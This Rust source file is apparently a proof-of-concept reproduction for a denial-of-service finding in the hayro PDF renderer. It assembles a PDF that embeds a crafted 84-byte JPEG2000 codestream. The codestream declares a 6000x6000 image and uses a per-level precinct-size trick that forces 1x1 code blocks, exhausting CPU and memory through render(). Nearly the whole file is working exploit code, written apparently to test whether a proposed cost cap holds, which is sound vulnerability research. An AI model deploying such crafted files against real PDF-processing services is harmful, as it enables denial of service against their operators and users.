// Standalone reproduction for candidate 014: does candidate 012's own (unmerged)
// `raw_code_block_layer_estimate` cap - which approximates a tile's total structural-build cost
// using only its *top* raw resolution level's area/code-block-area, on the assumption that lower
// resolution levels' geometrically-decaying areas contribute at most a converging ~4/3 factor on
// top of that - actually bound the real cost, once a codestream is allowed to set a distinct
// precinct size (and therefore a distinct code-block-size clamp, B-17/B-18) per resolution level?
//
// This drives a real, on-disk-shaped PDF (classic xref table, real `/JPXDecode` image XObject,
// placed small - `cm 20 0 0 20 90 90` on a 200x200 page - so the real, unmodified, top-level
// `hayro::render()` computes a small CTM-derived downscale hint) through the real, public
// `hayro::render()` entry point - the same function `hayro/examples/render.rs` itself calls.
//
// The embedded JPEG2000 codestream (`malicious.j2c`, 84 bytes) is a real, from-scratch,
// legitimately-parseable raw J2C codestream (SOC/SIZ/COD/QCD/SOT/SOD) declaring a raw size of
// 6000x6000, 3 decomposition levels (4 raw resolution levels), 32 quality layers, an empty
// (0-byte) tile-part body (so `build()`'s own structural-build cost, the thing under test, is
// isolated from `segment::parse`'s separate packet-parsing cost, same pattern candidate 011's own
// "empty-body baseline" used), and a real COD marker defining precincts (Scod bit 0) with a
// distinct precinct size per resolution level: PPx=PPy=15 (unbounded, so a normal 64x64
// code-block) at every level except the one right below the top, where PPx=PPy=1 - which, per the
// crate's own B-17/B-18 code-block clamp, forces that single level's code-block size down to 1x1,
// independently of the top level's own code-block size. This is a legitimate, spec-compliant use
// of the format's own per-resolution-level precinct-size mechanism (already implemented and
// exercised by this exact crate for ordinary progressive images), not a malformed/out-of-spec
// codestream. The PDF byte stream is the genuine external/adversarial input; nothing about the
// trigger path is faked or hand-simulated.
//
// Exit code convention: 0 = ran to completion (prints elapsed time and peak RSS either way -
// "reproduced" is judged by the printed numbers, not a crash/abort, since this is a DoS-via-cost
// finding, not a crash). Against the pristine tree (no cap at all, candidates 008/011/012/013's
// own fixes are all unmerged) this is expected to be slow/memory-heavy independent of this
// candidate's own point (which is specifically about candidate 012's *unmerged* cap, not the
// pristine tree) - see RESULT.md for how this candidate's own patch.diff (applied standalone,
// not stacked on candidate 012's) is what actually gets exercised as "after" by this repro's own
// justfile.

use hayro::hayro_interpret::InterpreterSettings;
use hayro::hayro_syntax::Pdf;
use hayro::{RenderCache, RenderSettings, render};
use std::time::Instant;

const JP2C: &[u8] = include_bytes!("malicious.j2c");

fn build_poc_pdf() -> Vec<u8> {
    let mut img_dict = format!(
        "<< /Type /XObject /Subtype /Image /Width 6000 /Height 6000 \
/BitsPerComponent 8 /ColorSpace /DeviceGray /Filter /JPXDecode /Length {} >>",
        JP2C.len()
    )
    .into_bytes();
    let mut obj4 = Vec::new();
    obj4.append(&mut img_dict);
    obj4.extend_from_slice(b"\nstream\n");
    obj4.extend_from_slice(JP2C);
    obj4.extend_from_slice(b"\nendstream");

    // Placed *small* on the page (20x20 out of a 200x200 page) so that hayro's own
    // CTM-derived downscale hint requests a small target resolution - the point being that
    // even though the *decoder* is asked for a tiny image, the codestream's raw declared
    // dimensions (independent of the hint) still drive the vulnerable code path.
    let content: &[u8] = b"q 20 0 0 20 90 90 cm /Im0 Do Q";
    let mut obj5 = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    obj5.extend_from_slice(content);
    obj5.extend_from_slice(b"\nendstream");

    let objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
        obj4,
        obj5,
    ];

    let mut out = Vec::new();
    out.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");

    let mut offsets = Vec::new();
    for (i, obj) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(obj);
        out.extend_from_slice(b"\nendobj\n");
    }

    let xref_offset = out.len();
    let n = objs.len() + 1;
    out.extend_from_slice(format!("xref\n0 {n}\n").as_bytes());
    out.extend_from_slice(b"0000000000 65535 f \n");
    for off in &offsets {
        out.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {n} /Root 1 0 R >>\n").as_bytes());
    out.extend_from_slice(format!("startxref\n{xref_offset}\n%%EOF").as_bytes());

    out
}

fn peak_rss_kb() -> Option<u64> {
    let status = std::fs::read_to_string("/proc/self/status").ok()?;
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("VmHWM:") {
            return rest.trim().trim_end_matches(" kB").trim().parse().ok();
        }
    }
    None
}

fn main() {
    let pdf_bytes = build_poc_pdf();
    println!(
        "built PoC PDF: {} bytes (embedded JPEG2000 codestream: {} bytes, declares \
6000x6000 raw, 3 decomposition levels, 32 quality layers, normal 64x64 code blocks everywhere \
except one intermediate resolution level forced to 1x1 via a tiny (PPx=PPy=1) precinct size; \
placed as a 20x20 thumbnail via `cm 20 0 0 20 90 90` on a 200x200 page)",
        pdf_bytes.len(),
        JP2C.len()
    );

    let pdf = Pdf::new(pdf_bytes).expect("PoC PDF should parse");
    let page = &pdf.pages()[0];

    let interpreter_settings = InterpreterSettings::default();
    let render_settings = RenderSettings::default();
    let cache = RenderCache::new();

    println!("calling the real, public hayro::render() and timing it...");

    let start = Instant::now();
    let pixmap = render(page, &cache, &interpreter_settings, &render_settings);
    let elapsed = start.elapsed();

    println!(
        "render() returned after {:?} (pixmap {}x{})",
        elapsed,
        pixmap.width(),
        pixmap.height()
    );

    if let Some(kb) = peak_rss_kb() {
        println!("peak RSS (VmHWM): {kb} kB (~{:.2} MB)", kb as f64 / 1024.0);
    }

    if elapsed.as_millis() >= 500 {
        println!(
            "SLOW: took >= 500ms to render a 20x20 thumbnail placement - consistent with a \
per-resolution-level precinct-size trick defeating a top-resolution-level-only cost estimate"
        );
    } else {
        println!("FAST: rendering completed quickly (or was rejected early by a size cap)");
    }
}
